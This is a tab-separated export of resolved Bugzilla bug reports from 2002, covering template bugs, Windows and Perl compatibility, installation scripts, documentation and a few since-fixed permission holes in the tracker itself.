140329%TAB%1019807306%TAB%9105%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Query/Bug List%TAB%Stagger headers have wrong order (buglist.cgi/table.html.tmpl)%TAB%Stagger headers have wrong order (buglist.cgi/table.html.tmpl)Normal view (header + content)  ID / Sev / Pri / Owner / State / Result / Summary  if I now choose stagger, the oder of the content doesn't change, but the header looks like this: Id       Sev         Owner          Result     Pri       State        Summary  all  |    b | pairs are reverted (except for "ID" which has no "a" which      | a    | could be reverted). This works ok at bugzilla.mozilla.org and is thus probably a template bug.
140332%TAB%1019807646%TAB%50537%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Documentation%TAB%versioncache needs to be deleted on bug status changes%TAB%versioncache needs to be deleted on bug status changes INFORMATION a checkout of the bugzilla project at Fri Apr 26 18:22:03 CEST 2002 still contains the documentation without the note to delete the $BUGZILLA_HOME/data/versioncache file  the fact that bugzilla optimizes database lookups by storing static information in the $BUGZILLA_HOME/data/versioncache file is already documented in the bugzilla guide at http://www.bugzilla.org/docs/html/geninstall.html in section 3.5.1 modifying your running system.  probably adding a paragraph similar to the following would be sufficient (this should undergo a proof reading since i am not a native speaker): make sure your bugzilla installation uses the modified values directly from the database by deleting the static information cache file $BUGZILLA_HOME/data/versioncache for further details please have a look at section 3.5.1 modifying your running system (should be a link)
140354%TAB%1019811474%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs,attachment and request management%TAB%edit attachment as comment displays pre- and post- html tags%TAB%edit attachment as comment displays pre- and post- html tagsEdit attachment is comment is displaying pre- and post- html tags ( <HTML><BODY>... and </BODY></HTML>) because the tag case has changed, and the regexp that matches and removes that stuff is not case-insensitive.  It should be case-insensitive.
140355%TAB%1019812054%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%Warn the user about not using a web server group%TAB%Warn the user about not using a web server groupNot using a web server group creates a number of security risks, including making directories and files world-writable.  This mode of running Bugzilla is useful for testing but should not be used in the real world.  We need to make that clearer to users with big warning signs.
140407%TAB%1019821743%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%Expunge template/default and template/custom references%TAB%Expunge template/default and template/custom referencesThese directories are no more.
140419%TAB%1019823797%TAB%9105%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Query/Bug List%TAB%query.cgi fails after search.html.tmpl has been splited%TAB%query.cgi fails after search.html.tmpl has been splitedWell now I know why it made no problems with the reviews: In Mozilla it looks ok, in Netscape 4.7x it doesn't work at all. (That is: all <form>-elements (<selection>, <input> type=text|radio etc.) dont work but all text is shown as plain text.)  Additionally: I get a warning from validator.w3.org that this </form> is not open: search.html.tmpl, last but one line.
140435%TAB%1019826107%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%Templatise GetCommandMenu%TAB%Templatise GetCommandMenuGetCommandMenu is, via %commandmenu%, included in Param('footerhtml'), which is itself called from the footer.html.tmpl script.  <sigh>.  Fixing this mess properly is somewhat complicated. But templatising the GetCommandMenu function will, at least, allow localisers to DTRT.  This is the _last_ templatisation bug I know about - I swear :-)
140437%TAB%1019826222%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Administration%TAB%Clean up parameters%TAB%Clean up parametersThe following parameters are no longer used, and can be removed: preferlists capitalizelists errorhtml blurbhtml mostfreqhtml nummilestones entryheaderhtml  Currently, checksetup.pl just nukes removed parameters. We should probably dump the HTML ones, at least, to a file and tell the admin where it is.   The following parameters are deprecated; that is, if you want to change them from the default, you are better off editing the relevant template. We should say so in their descriptions: headerhtml bodyhtml  bannerhtml footerhtml
140513%TAB%1019858948%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%User Interface%TAB%ValidateOutputFormat needs to be able to return other content types "by default" as well.%TAB%ValidateOutputFormat needs to be able to return other content types "by default" as well.Currently, ValidateOutputFormat returns info suitable for an HTML template by default. This is not always what you want (see e.g. the intial comment templates.)  There are several possible solutions to this.
140553%TAB%1019884640%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%Remaining instance of uri filter.%TAB%Remaining instance of uri filter.I was having a discussion on IRC about the general uselessness of the URI filter compared to url_quote, and it came up we still have an instance of the uri filter, this line in bug/edit.html.tmpl.  <a href="[% bug.bug_file_loc FILTER uri %]">URL:</a>  This needs to be fixed.  Firstly, the uri filter shouldn't be there.  If the URL entered is invalid, then clicking the URL should not take you to a magically valid URL.  This would discourage fixed up invalid URLs.  There is no "let's be safe" here, invalid URLs shouldn't hurt anyone (correct me if I'm wrong).  Secondly, and more worryingly, this needs to be html filtered.
140564%TAB%1019887990%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%Unquoted variable in regexp in globals.pl.%TAB%Unquoted variable in regexp in globals.pl.In GetOutputFormats in globals.pl the following line appears:    if ($file =~ /^$script-(.+)\.(.+)\.(tmpl)$/) {  $script should be quoted using \Q and \E.  This is probably not a big issue as the possible values are hardcoded into Bugzilla, and the regular expression operators probably wouldn't appear (but what about '.'?), but it should be fixed.
140629%TAB%1019906897%TAB%10297%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%SyncAnyPendingShadowChanges() should not be called from a template%TAB%SyncAnyPendingShadowChanges() should not be called from a templateSyncAnyPendingShadowChanges() recently got moved out of PutFooter() into the footer template.  Personally I think this is a Bad Idea because this is a code process issue and not a user interface issue, and we shouldn't be depending on a template to do this.  This should be in the Perl code.
140633%TAB%1019909587%TAB%34938%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%directory datatemplate created in the bugzilla root directory%TAB%directory datatemplate created in the bugzilla root directoryUnder windows 2000 a directory named datatemplate is created by bugzilla.
140664%TAB%1019930050%TAB%13272%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Installation & Upgrading%TAB%checksetup.pl fails on perl 5.005_02,checksetup.pl fails on perl 5.005%TAB%checksetup.pl fails on perl 5.005_02,checksetup.pl fails on perl 5.005Running checksetup.pl after upgrading to the latest CVS sources of bugzilla (which require TT 2.07 and include template precompilation) I get the following error:  Not a subroutine reference at /home/bugzilla/perl5/lib/File/Find.pm line 197 (#1)      (F) Perl was trying to evaluate a reference to a code value (that is, a     subroutine), but found a reference to something else instead.  You can     use the ref() function to find out what kind of ref it really was.     See also perlref.  Uncaught exception from user code:         Not a subroutine reference at /home/bugzilla/perl5/lib/File/Find.pm line 197.         File::Find::wrap_wanted('HASH(0x55d4d4)') called at /home/bugzilla/perl5/lib/File/Find.pm line 202         File::Find::find('HASH(0x55d4d4)', 'template/en/default') called at ./checksetup.pl line 845  This is perl, version 5.005_02 built for sun4-solaris-thread on SunOS leibniz 5.6 Generic_105181-16 sun4u sparc SUNW,Ultra-2
140674%TAB%1019936385%TAB%13272%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General,Documentation%TAB%choose-product.html.tmpl fails on TT 2.07 with perl 5.005_02,2.16 release notes -> choose-product.html.tmpl fails on TT 2.07 with perl 5.005_02,documentation -> choose-product.html.tmpl fails on TT 2.07 with perl 5.005_02%TAB%choose-product.html.tmpl fails on TT 2.07 with perl 5.005_02,2.16 release notes -> choose-product.html.tmpl fails on TT 2.07 with perl 5.005_02,documentation -> choose-product.html.tmpl fails on TT 2.07 with perl 5.005_02When enter_bug.cgi or describecomponents.cgi are called without a product, then the choose-product page is shown. With TT 2.07 (as opposed to TT 2.06 which works fine) the [% FOREACH p = proddesc.keys.sort %] loop doesn't seem to work.  The result is that only the first product is displayed correctly. For the remaining products, the space is there, even the colon separating the product name from the description, but everything else is missing.
140765%TAB%1019985219%TAB%43662%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%midair collision has a template error%TAB%midair collision has a template errorMidair collision template has a reference to "show/comments.tmpl", which is apparently gone (and replaced by 'bug/comments.html.tmpl'?). I'll attach a patch which changes the filename.
140770%TAB%1019988869%TAB%43662%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%Navigation doesn't work after creating a new bug%TAB%Navigation doesn't work after creating a new bugpost_bug.cgi doesn't seem to pass the bug_list parameter to the created.html.tmpl template, so when navigate.html.tmpl is called in turn, a warning about undefined bug_list.size is issued. I have a patch proposal, attaching it soon.
140782%TAB%1019993395%TAB%43662%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Email Notifications%TAB%New processmail piping style doesn't work on Win32/ActiveState%TAB%New processmail piping style doesn't work on Win32/ActiveStateDuring the templatisation process several of the cgis have turned into using the open pipe syntax (like  open(PMAIL, "-|") or exec('./processmail', $id, $::COOKIE{'Bugzilla_login'}); $mailresults .= $_ while <PMAIL>; close(PMAIL); print "foo"; )  The open pipe system doesn't work on ActiveState Perl for Win32. It totally messes up the system; the output of the command is directed to stdout normally (as if no piping occurred), but even worse, no subsequent output is delivered to stdout! So in the example above, foo would not be printed, but the processmail output would. The exact characteristics of the problem may be slightly different, that was just my preliminary test.  The behavior is (to some extent) documented here:  http://aspn.activestate.com/ASPN/Reference/Products/ActivePerl/lib/Pod/perlfork.html (see section Caveats and limitations)  Some workarounds are presented, but there are some difficult complications involved - see the bugs section on that page.   That processmail thingy should really be a package/module. If bug 124174 were fixed by 2.16, this would be fixed as well. Reconsider the milestone for 124174?
140784%TAB%1019994511%TAB%43662%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Administration%TAB%edit*.cgi need a use lib ".",edit*.cgi need a use lib "." on Win32/IIS w/ taint%TAB%edit*.cgi need a use lib ".",edit*.cgi need a use lib "." on Win32/IIS w/ taintAt least on W2k ActiveState default installation the edit*.cgi don't work, because  they cannot find the required 'cgi.pl'.   I'll attach a patch which adds 'use lib "."' to all the edit*.cgi files. This is the solution used in the other cgis as well.
140953%TAB%1020066353%TAB%43662%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Administration,attachment and request management%TAB%Creating the first attachment status fails%TAB%Creating the first attachment status failsCreating the first attachment status gives a warning, because SELECT MAX(ID) returns an undefined value when run against an empty table. The attachment is created properly, but the output fails rather harshly.
140999%TAB%1020076877%TAB%43662%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Creating/Changing Bugs,attachment and request management%TAB%Editing attachments should be disabled  if user doesn't have edit permissions,Users without edit permissions for an attachment should still be able to make comments%TAB%Editing attachments should be disabled  if user doesn't have edit permissions,Users without edit permissions for an attachment should still be able to make commentsGahh... I just wrote quite a long commentary on one patch using edit attachment / Edit Attachment as bug. After clicking submit it said that I don't have the permissions to edit attachments. True, but it could've told me that without giving me that textarea to waste my time on. ;-) Now I had to copy-paste the patch and write down my comments as a normal patch comment.  An alternative fix might be to allow posting attachment-comments with the same privs as posting comments.
141006%TAB%1020078003%TAB%43662%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Administration%TAB%edit*.cgis should be run in taint mode%TAB%edit*.cgis should be run in taint modeTaint mode should be enabled for admin cgis as well. See discussion in bug 140784 - it may be that this is nothing more than adding -T to the shebang lines, but better test carefully. I guess this is 2.18, then.
141010%TAB%1020078293%TAB%32335%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla-General,attachment and request management%TAB%Attachment list on show_bug.cgi should report who added flags.%TAB%Attachment list on show_bug.cgi should report who added flags.Current right-side of the attachment list:   |   Status         |  Actions  | ---------------------------------  | has-review       |           |  | has-super-review |   Edit    |  | has-approval     |           | ---------------------------------  Expected right-side of the attachment list:   |   Status                                 |  Actions  | ---------------------------------------------------------  | has-review by caillon@returnzero.com     |           |  | has-super-review by brendan@mozilla.org  |   Edit    |  | has-approval by asa@mozilla.org          |           | ---------------------------------------------------------  This would be a huge aid for checkins.  One doesn't need to skim through bug comments just to find out who marked attachments what.
141036%TAB%1020084951%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%User Interface%TAB%Add INTERFACE comments to all templates,Add INTERFACE comments to some templates%TAB%Add INTERFACE comments to all templates,Add INTERFACE comments to some templatesINTERFACE comments are good; they allow admins to see what's changed about an interface to a template. We should have them everywhere.   As they are just comments, adding them is just a case of writing them.
141326%TAB%1020171482%TAB%5898%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%User Interface%TAB%broken hyperlink in editkeywords.cgi%TAB%broken hyperlink in editkeywords.cgiIn editkeywords.cgi, when deleting a keyword it generates a link to  sanitycheck.cgi to Rebuild the keyword cache. This link has an incorrect  closing tag for the hyperlink and there fore bleeds over in the next line   generated by PutTrailer.     sub RebuildCacheWarning {        print "<BR><BR><B>You have deleted or modified a keyword. You must rebuild  the keyword cache!<BR></B>";      print "You can rebuild the cache using sanitycheck.cgi. On very large  installations of Bugzilla,<BR>";      print "This can take several minutes.<BR><BR><B><A  HREF=sanitycheck.cgi?rebuildkeywordcache=1>Rebuild cache</HREF><BR></B>";    }    The </HREF> should be </A> 
141385%TAB%1020186272%TAB%22360%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Reporting/Charting%TAB%dependency graph title is incorrect when doall is specified%TAB%dependency graph title is incorrect when doall is specifiedDependency graph's with all bugs are displayed with a title which includes a bug number.  Steps to reproduce: 1) Display a bug 2) Click 'Show dependency graph' 3) In the form at the bottom, check 'Show every bug in the system with dependencies' and submit  Expected Results: A generic title  Actual Results: A title 'Dependency Graph for bug 123'
141557%TAB%1020250719%TAB%51221%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%User Accounts%TAB%allowuserdeletion security hole in edituser.cgi%TAB%allowuserdeletion security hole in edituser.cgiIf I'm a user with the ability to edit other users then I have the ability to delete other users regardless of the allowuserdeletion parameter flag. I simply select a user, then change 'edit' to 'del' in the URL.  This is due to two missing "exit;" lines in editusers.cgi. To find them do a search for "PutTrailer" in editusers.cgi - after every occurence of PutTrailer (except the definition) there should be an exit on the next line.
141593%TAB%1020257209%TAB%36099%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Creating/Changing Bugs%TAB%Dependencies can be changed without any permissions,You can add/remove dependencies on bugs you can't see%TAB%Dependencies can be changed without any permissions,You can add/remove dependencies on bugs you can't seeTo change the dependencies of a bug you don't have to have any rights. Anyone with a bugzilla account can do this with any bug he can access. I think this is insecure and a normal user without special rights should only be able to modify the dependencies for his own bugs.
141609%TAB%1020261416%TAB%40200%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%"Version unspecified" error when changing product with product groups enabled%TAB%"Version unspecified" error when changing product with product groups enabledIn a bugzilla installation using the tip of CVS as of May 01, 2002, it can be  impossible to change an existing bug to a differrent produst group. If this is  attempted with bith usebuggroups and usebuggroupsentry enabled. A message  indicating that "version" is not specified, this may be a bug in your browser is  displayed by process_bug.cgi after the "Verify Bug Group" screen.  This problem appears to be caused by the following line in  verify-new-product.html.tmpl version 1.2.   It appears that the contents of the  version and component fields are excluded from propagating from one page to the  next.  The following change (not excluding the version and component fields) seems to  make the difference.  bash-2.03$ cvs diff verify-new-product.html.tmpl Index: verify-new-product.html.tmpl =================================================================== RCS file: /cvsroot/mozilla/webtools/bugzilla/template/en/default/bug/process/ver ify-new-product.html.tmpl,v retrieving revision 1.2 diff -r1.2 verify-new-product.html.tmpl 39c39 < [% PROCESS "global/hidden-fields.html.tmpl" exclude="^version|component|target _milestone$" %] --- > [% PROCESS "global/hidden-fields.html.tmpl" exclude="^target_milestone$" %]    This problem has been verified with Netscape 4.76 and ie5. Client running on Win2000 Server running Solaris 2.7, Perl 5.6.1,  Tip of CVS as of 5-1-2001.
141635%TAB%1020267799%TAB%22360%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Reporting/Charting%TAB%dependency graph requires bug id when requesting 'doall'%TAB%dependency graph requires bug id when requesting 'doall'In order to generate a dependency graph of 'every bug in the system with dependencies', the form variable 'id' is required even though it is not required or useful.
141639%TAB%1020268866%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%templatize template parameters in header.html.tmpl%TAB%templatize template parameters in header.html.tmplBug 140435 templatizes the "template parameters" (parameters containing a crude form of templates by which installations have been able to customize their look and feel in previous versions of Bugzilla) for footer.html.tmpl.  If it's necessary for footer.html.tmpl, then it's also necessary for header.html.tmpl.
141716%TAB%1020305032%TAB%32335%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Query/Bug List%TAB%Mozilla context menu broken on query.cgi%TAB%Mozilla context menu broken on query.cgiUsing a nightly build, and probably on nightlies for a while back, there is no context menu on the query page.  This is because query.cgi defines a getSelection() JS method.  However, getSelection() is a method of the DOM0 window object (global scope).  Defining this function over-writes the native method and uses the bugzilla method instead.  Because context menu relies on window.getSelection() for its Search engine context menu, the context menu breaks.  The bug is two-fold.  Bugzilla should not use getSelection or any other names such as this, and Mozilla should either prevent getSelection from being modified by code like this, or not break when this happens.  This bug covers renaming the getSelection() method in Bugzilla.  I will file a separate bug for the Mozilla issue.
141951%TAB%1020375843%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Administration,attachment and request management,Installation & Upgrading%TAB%Make sure max attachment size is small enough to not cause MySQL errors.,Set the max_packet_size for attachments (and bugs_fulltext) when connecting to MySQL%TAB%Make sure max attachment size is small enough to not cause MySQL errors.,Set the max_packet_size for attachments (and bugs_fulltext) when connecting to MySQLIf the max attachment size in the system parameters is larger than the maximum size MySQL allows, obscure MySQL error messages can get spewed out to the user if their attachment is bigger than the MySQL size.  We could possibly use the SQL "SHOW VARIABLES" and read off the "max_allowed_packet" variables.  From there we could force the administration page to make the max attachment size smaller than this.  I figure there's probably some overhead in the packet besides the attachment, so it would actually have to be some appropriately smaller size.
142104%TAB%1020423357%TAB%9186%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Query/Bug List%TAB%enhancements in buglists should be gray,enhancements in buglists should be grey%TAB%enhancements in buglists should be gray,enhancements in buglists should be greyBugs marked as enhancements are currently shown in italic in buglists. This  looks very reversed since enhancements should get *less* attention, not more. I  suggest we use some gray color (|color: light gray;| is good IMHO) instead and  remove the italic font-style.  I know there are plans to design a better styling system for the buglist, but  this is just a request to change the default from italic to gray, both until we  get the new styling system, and as defaults in the new styling system.
142231%TAB%1020487288%TAB%9105%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%User Interface%TAB%template/.cvsignore should contain es, de, ... not custom%TAB%template/.cvsignore should contain es, de, ... not customThe .cvsignore file in ./template/ contains presently custom. Since custom moved to ./template/en/ this is no longer needed. Instead it would be nice if it contained languages which are not in CVS (yet?). If I recall correctly there are presently only Spanish and German (es, de), but there might be others.
142394%TAB%1020585222%TAB%43662%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Reporting/Charting%TAB%Bug counts by engineer should be sortable,Bug counts should be sortable,Tabluar and graphical reports should be sortable,Tabular and graphical reports should be sortable,Tabular reports should be sortable%TAB%Bug counts by engineer should be sortable,Bug counts should be sortable,Tabluar and graphical reports should be sortable,Tabular and graphical reports should be sortable,Tabular reports should be sortableThe bug counts by engineer view should be sortable through clickable headers or a similar mechanism.
142744%TAB%1020740604%TAB%43662%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Testing Suite%TAB%Testing suite should work on Win32%TAB%Testing suite should work on Win32Windows development is seriously harmed by the fact that the testing suite doesn't run on Windows. I can take a look at this as I'm the one with the need.   Ccing zach@zachlipton.com for comments: do you know if this is downright impossible? At least the runtests.sh needs a Windows companion, but wonder if Test:: modules work equally on Win32 platforms?
142792%TAB%1020754551%TAB%33620%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Installation & Upgrading%TAB%Output from checksetup.pl contains misspelled words%TAB%Output from checksetup.pl contains misspelled wordsThe patch for Bug 140355 added some output that the user will see under certain circumstances.  It contains a couple misspellings.  Also changed "Perl" to "Perl code" and "as the user" to "as the user that".  Patch to follow shortly.
142890%TAB%1020779728%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%User Interface%TAB%make banner html a separate template%TAB%make banner html a separate templateIt's good to chop up templates into smaller bites so installations can customize them with minimal forking and CVS conflict.  The template formerly known as the "bannerhtml" parameter is now part of header.html.tmpl, even though it's a good candidate for customization (installations that do nothing else are likely to remove this explicit reference to mozilla.org).  That code should be broken out into a separate template.
142950%TAB%1020802773%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%User Interface%TAB%Queries in footer don't work properly%TAB%Queries in footer don't work properlyNon-breaking spaces get HTML-escaped. And the links don't work. 
143040%TAB%1020841527%TAB%33620%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Installation & Upgrading%TAB%Tidy up remove parameters message in checksetup.pl%TAB%Tidy up remove parameters message in checksetup.plThe message that is printed out when checksetup.pl removes unused parameters from data/params has way too many spaces for its indented lines.  Patch to follow shortly.  N.B. The WriteParams() method in defparams.pl already removes unused parameters itself, but it prints out HTML (use of <em></em> tags) and does not save the old parameters to the old-params.txt file.  If there is an acceptable way to determine when WriteParams() is being called from checksetup.pl versus a CGI script (check if  $0 =~ m/checksetup.pl$/ ?), then checksetup.pl could be cleaned up to simply call WriteParams() after require-ing the appropriate files, and the old-params.txt behavior could be added to WriteParams() in defparams.pl.  Any thoughts on this?  Is there a better way to print out the "removed from params file" text through the header template?  (I'll go look.)
143045%TAB%1020843730%TAB%12919%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Creating/Changing Bugs%TAB%Bug groups text is unclear%TAB%Bug groups text is unclearWhen entering or changing a bug, if there are any bug groups that bug can belong  to, users see the text "Only users in the selected groups can view this bug",  and then a list of groups with checkboxes.  It is unclear whether this is  supposed to mean "Only users in _all_ of the selected groups can view this bug"  or "Only users in _any_ of the selected groups can view this bug".  We should change that text to read "Only users in all of the selected groups can  view this bug", to clear up any confusion. 
143066%TAB%1020849611%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%User Interface%TAB%Footer shows as logged out on show_bug.cgi%TAB%Footer shows as logged out on show_bug.cgiI have no idea how I missed this :-( bug_form.pl overwrites $vars->{'user'}, and so the footer can't find the fields it wants.
143091%TAB%1020855015%TAB%20977%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%No email to the qa contact when creating bugs%TAB%No email to the qa contact when creating bugsWhen the default qa contact has only the add/remove option enabled in her email preferences, she will not get any email when a bug is submitted.  When I was looking into this a bit I found that in post_bug.cgi, the qa_contact field is referenced differently in a few places. So this could be the cause.  post_bug.cgi Line 143:         $::FORM{'qa_contact'} = $qa_contact;  post_bug.cgi Lines 290-292: if (defined $::FORM{qacontact}) {     push (@ARGLIST, "-forceqacontact", DBID_to_name($::FORM{qacontact})); }
143108%TAB%1020859886%TAB%4054%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Documentation,Bugzilla-General%TAB%localconfig says that $webservergroup = "" will prevent permission changes%TAB%localconfig says that $webservergroup = "" will prevent permission changesApparently the following is no longer true:   # # This is the group your web server runs on. # If you have a windows box, ignore this setting. # If you do not wish for checksetup to adjust the permissions of anything, # set this to "". # If you set this to anything besides "", you will need to run checksetup.pl # as root. $webservergroup = "";
143116%TAB%1020862321%TAB%45831%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Documentation%TAB%install notes missing apache install tip%TAB%install notes missing apache install tipIn the Installation section (3.2.15), it says: =====    Assuming your web server runs as user "apache", and Bugzilla is    installed in "/usr/local/bugzilla", here's one way to run    checksetup.pl as the web server user. As root, for the second run of    checksetup.pl, do this:  bash# chown -R apache:apache /usr/local/bugzilla bash# su - apache bash# cd /usr/local/bugzilla bash# ./checksetup.pl =====  However, this doesn't work for me.  After a few minutes I found that my "apache" user had "/bin/false" as the login shell (as a security feature), so the "su - apache" failed and it went downhill from there.  The fix was very simple, just change the login shell to bash, do the commands, then change the login shell back.  This seems to be the default for RedHat, so I expect it to bite others too.  I feel this needs to be mentioned in the docs near these commands.
143126%TAB%1020863759%TAB%33620%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Testing Suite%TAB%Fix warning messages about *::TESTOUT and clean up test code%TAB%Fix warning messages about *::TESTOUT and clean up test codeNewer versions of the Test::Simple module changed where the *TESTOUT filehandle is defined.  Originally, it was in Test::More, but newer versions put it in Test::Builder. Since landfill was rebuilt, it got the newer version of Test::Simple while the tests still assume the older version. See the tinderbox log files for examples of the warning.  http://tinderbox.mozilla.org/showlog.cgi?log=Bugzilla/1020893438.9205.gz&fulltext=1  Also, some of the test scripts now use 'use' lines instead of the original 'BEGIN {}' blocks.  I'll attach a patch shortly that fixes the *::TESTOUT issues and cleans up all of the test scripts so that they are self-consistent.
143155%TAB%1020870201%TAB%15368%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Testing Suite%TAB%Make runtests.sh be a .pl%TAB%Make runtests.sh be a .plruntests.sh needs to be a perl script so it works under windows and so  we can do other special stuff easier later on. This is also needed for  newinstall.
143231%TAB%1020919027%TAB%43662%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%Changing a bug with an empty buglist gives a warning%TAB%Changing a bug with an empty buglist gives a warningIf I have just reset my cookies and have a totally empty buglist, changing a  bug causes navigate.html.tmpl to elicit a warning:  Argument "" isn't numeric in numeric gt (>) at  data/template/en/default/bug/navigate.html.tmpl line 19 (#1) (W numeric) The  indicated string was fed as an argument to an operator that expected a numeric  value instead. If you're fortunate the message will identify which operator  was so unfortunate. [Thu May 9 16:25:57 2002] 
143251%TAB%1020929209%TAB%5898%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Administration%TAB%RFE: checksetup.pl should report module version in error message%TAB%RFE: checksetup.pl should report module version in error messageWhen checksetup.pl reports that a required module is missing from the system,  it should preferrably also report the minimum required version of that module.  For example, I have Template-Toolkit installed on my system yet when I ran  checksetup.pl it merely said that I need to install the Template-Toolkit which  in my mind I already have. Except mine was 2.06 and it was looking for 2.07.  Currently it only maintains a array called @missing which contains module  names of missing modules. We would need to change this to also maintain a list  of versions also mapped to the proper module. So we could change @missing to  %missing with the module name as the key and the version as the value. I will  make a patch and attach to this report.
143313%TAB%1020947130%TAB%52154%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Creating/Changing Bugs%TAB%process_bug.cgi calls CheckCanChangeField() with --do_not_change-- values%TAB%process_bug.cgi calls CheckCanChangeField() with --do_not_change-- valuesThis is not a problem with Mozilla's Bugzilla per se, but it is for those of us who are customizing it (and maybe someday you folks would be in this situation).  I have added logic to CheckCanChangeField to restrict changing the contents of certain fields (ones that I have added) to members of groups I have defined. This worked great until someone tried to use the extended "Change Multiple bugs at once" capability and they were caught by the membership checks even though they weren't changing those fields.  This is because the logic for handling multiple bugs calls CheckCanChangeField (line 842 in process_bug.cgi) with the form value even though the form value is --do_not_change--. Of course, this differs from what is in the database, so it falls through to my checks for membership and the change is refused.  I think CheckCanChangeField() (or the call to it) should check for --do_not_change-- in the field value. I suspect the reason no one else has run into this is because almost all the fields currently being tested in CheckCanChangeField happen to not be ones which are set to --do_not_change-- on the multiple bug form. (The one exception is QA contact, which has its own special check).  So, thought I would share my experience in hopes it would save someone else somewhere along the way. Hope this is understandable.
143486%TAB%1021017329%TAB%9105%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%enter_bug.cgi: Using ?format=simple doesn't work%TAB%enter_bug.cgi: Using ?format=simple doesn't workIt is now possible to use more than one format for enter_bug.cgi (bug 138903). But here it doesn't work. I traced it down to   my $format = ValidateOutputFormat($::FORM{'format'}, "create"); is called. This sets $scriptdir to "create". It works with "bug/create"
143490%TAB%1021017977%TAB%34938%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Installation & Upgrading%TAB%checksetup.pl is calling functions not suported by windows,checksetup.pl is calling functions not supported by windows%TAB%checksetup.pl is calling functions not suported by windows,checksetup.pl is calling functions not supported by windowschecksetup.pl is calling which and stty functions that ar not supported by  windows.
143547%TAB%1021033540%TAB%5189%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%User Interface%TAB%"secure bugs" also grey in list (.bz_secure set) even if usebuggroups is on%TAB%"secure bugs" also grey in list (.bz_secure set) even if usebuggroups is oncss/buglist.css says:  /* Style secure bugs if the installation is not using bug groups.  * Installations that *are* using bug groups are likely to be using  * them for almost all bugs, in which case special styling is not  * informative and generally a nuisance.  */ .bz_secure { color: black; background-color: lightgrey; }  I'm using bug groups, having usebuggroups set to "On" in parameters. bug_list.cgi is setting bz_secure though and so all bugs in my bug lists are always shown with grey background :(
143560%TAB%1021038516%TAB%10297%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%showdependencytree.cgi eats all available memory if there's a circular dependency%TAB%showdependencytree.cgi eats all available memory if there's a circular dependencyshowdependencytree.cgi eats all available memory if there's a circular dependency.  The kernel usually ends up killing the process.
